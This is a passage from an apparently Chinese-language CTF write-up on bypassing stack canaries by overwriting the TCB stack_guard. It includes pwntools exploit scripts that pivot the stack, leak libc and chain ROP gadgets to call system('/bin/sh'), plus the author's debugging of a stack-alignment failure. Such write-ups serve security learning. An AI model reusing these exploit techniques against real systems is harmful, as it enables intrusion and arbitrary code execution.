class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_t</span></span><br><span class="line">pthread_self (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 这是64位下的THREAD_SELF</span></span><br><span class="line"><span class="comment">/* Return the thread descriptor for the current thread.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The contained asm must *not* be marked volatile since otherwise</span></span><br><span class="line"><span class="comment">   assignments like</span></span><br><span class="line"><span class="comment">pthread_descr self = thread_self();</span></span><br><span class="line"><span class="comment">   do not get optimized away.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SELF \</span></span><br><span class="line">  (&#123; struct pthread *__self;      \</span><br><span class="line">     <span class="keyword">asm</span> (<span class="string">&quot;mov %%fs:%c1,%0&quot;</span> : <span class="string">&quot;=r&quot;</span> (__self)      \</span><br><span class="line">  : <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, header.self)));       \</span><br><span class="line">     __self;&#125;)</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">//这是32位下的THREAD_SELF</span></span><br><span class="line"><span class="comment">/* Return the thread descriptor for the current thread.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The contained asm must *not* be marked volatile since otherwise</span></span><br><span class="line"><span class="comment">   assignments like</span></span><br><span class="line"><span class="comment">pthread_descr self = thread_self();</span></span><br><span class="line"><span class="comment">   do not get optimized away.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SELF \</span></span><br><span class="line">  (&#123; struct pthread *__self;      \</span><br><span class="line">     <span class="keyword">asm</span> (<span class="string">&quot;movl %%gs:%c1,%0&quot;</span> : <span class="string">&quot;=r&quot;</span> (__self)      \</span><br><span class="line">  : <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, header.self)));      \</span><br><span class="line">     __self;&#125;)</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Thread descriptor data structure.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="keyword">tcbhead_t</span> header; <span class="comment">// tcbhead_t结构在本章前面有介绍</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* multiple_threads is enabled either when the process has spawned at</span></span><br><span class="line"><span class="comment"> least one thread or when a single-threaded process cancels itself.</span></span><br><span class="line"><span class="comment"> This enables additional code to introduce locking before doing some</span></span><br><span class="line"><span class="comment"> compare_and_exchange operations and also enable cancellation points.</span></span><br><span class="line"><span class="comment"> The concepts of multiple threads and cancellation points ideally</span></span><br><span class="line"><span class="comment"> should be separate, since it is not necessary for multiple threads to</span></span><br><span class="line"><span class="comment"> have been created for cancellation points to be enabled, as is the</span></span><br><span class="line"><span class="comment"> case is when single-threaded process cancels itself.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Since enabling multiple_threads enables additional code in</span></span><br><span class="line"><span class="comment"> cancellation points and compare_and_exchange operations, there is a</span></span><br><span class="line"><span class="comment"> potential for an unneeded performance hit when it is enabled in a</span></span><br><span class="line"><span class="comment"> single-threaded, self-canceling process.  This is OK though, since a</span></span><br><span class="line"><span class="comment"> single-threaded process will enable async cancellation only when it</span></span><br><span class="line"><span class="comment"> looks to cancel itself and is hence going to end anyway.  */</span></span><br><span class="line">      <span class="keyword">int</span> multiple_threads;</span><br><span class="line">      <span class="keyword">int</span> gscope_flag;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">      <span class="keyword">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; header;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>那么基于此，可以修改exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    # debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1850</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27; * 0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recv(6)+&#x27;\x00\x00&#x27;</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    <span class="meta">#info(<span class="meta-string">&quot;libc.address is %#x&quot;</span>, libc.address)</span></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>, leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    libc.address = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>,leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    info(<span class="string">&quot;libc.address is %#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#payload = <span class="meta-string">&#x27;&#x27;</span></span></span><br><span class="line">    #payload += p64(0)</span><br><span class="line">    <span class="meta">#payload += p64((libc.address+0x4f3c2))</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print (<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path])  # , env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改了payload的长度，仅覆盖至<code>stack_guard</code>即可</p><p>本以为大功告成，可是事与愿违，当我再次运行exp时，仍然抛出了错误</p><p>我:????????</p><p>本以为是改的不对，计算错了偏移量，但是当我再一次gdb调试后，发现原来的错误处已经正常</p><p><img src="/image/bypass-Canary/also_gg.png" alt="also_gg"></p><p>那就很奇怪了，为什么还是不行呢？</p><p>继续调试，同时我写了一个正常调用system函数的代码做对比</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line"> getchar();</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t;</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经过长时间的调试，我发现了奇怪的地方</p><p><img src="/image/bypass-Canary/wired.png" alt="wired"></p><p>这里显示syscall调用的是<code>wait4()</code>这个系统调用，如果是正常的调用system函数，程序应当在syscall执行之后阻塞，但是在执行exp时，却并没有阻塞，而是直接跳了过去，那也就是说<code>wait4()</code>并没有阻塞，而是直接退出了</p><p>这令我很疑惑，于是我查看了<code>wait4()</code>试图等待的进程pid，即rdi寄存器的值，如下</p><p><img src="/image/bypass-Canary/pid_gg.png" alt="pid_gg"></p><p>可以发现，<code>wait4()</code>想要等待的进程已经退出，成为了僵尸进程，而如果正常调用system，那么<code>wait4()</code>等待的进程应当如下</p><p><img src="/image/bypass-Canary/pid_not_gg.png" alt="pid_not_gg"></p><p>也就是说，system调用的<code>/bin/sh</code>并没有成功启动，于是，我把目光转向了之前的汇编代码，寻找启动<code>/bin/sh</code>的地方</p><p>很快我就找到了相关代码</p><p><img src="/image/bypass-Canary/start_system.png" alt="start_system"></p><p>可以看到这里syscall调用了clone这个系统调用，就是在这里，<code>/bin/sh</code>被启动了</p><p>之后我便做了对比，但是我却发现，正常情况下，当执行到此处汇编代码时，完全可以正常启动，而各个寄存器参数值与我使用exp时并无太大区别，按理说并不会无法启动</p><p>到这里算是陷入了僵局，正当我掉头发时，我突然想起了之前看过的一篇文章 <a href="https://www.cnblogs.com/Rookle/p/12871878.html">https://www.cnblogs.com/Rookle/p/12871878.html</a></p><p>而你也可以看到，在使用exp时，当程序执行到syscall时，rsp并没有16字节对齐</p><p>于是我抱着试试看的心态，手动将rsp对齐</p><p><img src="/image/bypass-Canary/alignment.png" alt="alignment"></p><p>执行</p><p><img src="/image/bypass-Canary/after_align.png" alt="after_align"></p><p>此时rax是返回的进程pid，查看一下进程情况</p><p><img src="/image/bypass-Canary/clone_successfuly.png" alt="clone_successfuly"></p><p>可以看到，正常地启动了</p><p>那么也就是说，在syscall前，我们必须保证rsp对齐16字节</p><p>其实在exp中要解决这个问题也简单，只需要在最终的payload中添加一个ret的gadget就可以了</p><p>最终版如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    # debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    ret = <span class="number">0x0000000000400287</span></span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1850</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27; * 0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recv(6)+&#x27;\x00\x00&#x27;</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    <span class="meta">#info(<span class="meta-string">&quot;libc.address is %#x&quot;</span>, libc.address)</span></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>, leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    libc.address = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>,leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    info(<span class="string">&quot;libc.address is %#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#payload = <span class="meta-string">&#x27;&#x27;</span></span></span><br><span class="line">    #payload += p64(0)</span><br><span class="line">    <span class="meta">#payload += p64((libc.address+0x4f3c2))</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(ret)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print (<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path])  # , env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><p>运行后如下：</p><p><img src="/image/bypass-Canary/pwn.png" alt="pwn"></p><p>可以看到，成功getshell</p><p>另外，对于上面所提到的rsp需要对齐16字节的问题，摘录一段NASM的原话如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The stack pointer %rsp must be aligned to a 16-byte boundary before making a call. </span><br><span class="line">Fine, but the process of making a call pushes the return address (8 bytes) on the stack,so when a function gets control, %rsp is not aligned. </span><br><span class="line">You have to make that extra space yourself, by pushing something or subtracting 8 from %rsp.</span><br></pre></td></tr></table></figure><p>Linus在邮件中也提到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">On Tue, Jan <span class="number">10</span>, <span class="number">2017</span> at <span class="number">7</span>:<span class="number">30</span> PM, Linus Torvalds</span><br><span class="line">&lt;torvalds@linux-foundation.org&gt; wrote:</span><br><span class="line">&gt;</span><br><span class="line">&gt; If you really want more <span class="built_in">stack</span> alignment, you have to generate that</span><br><span class="line">&gt; <span class="function">alignment yourself by <span class="title">hand</span> <span class="params">(<span class="keyword">and</span> have a 